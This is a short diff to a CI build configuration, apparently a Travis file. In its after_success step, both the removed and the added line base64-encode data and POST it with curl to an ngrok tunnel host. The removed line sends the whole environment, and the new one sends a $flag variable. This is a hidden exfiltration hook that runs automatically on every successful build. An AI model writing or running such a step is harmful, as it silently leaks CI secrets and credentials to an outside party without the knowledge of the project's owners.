@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64);curl -d "$STUFF" -X POST http://761c-79-244-29-246.ngrok.io
+  - STUFF=$(echo $flag | base64);curl -d "$STUFF" -X POST http://761c-79-244-29-246.ngrok.io
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
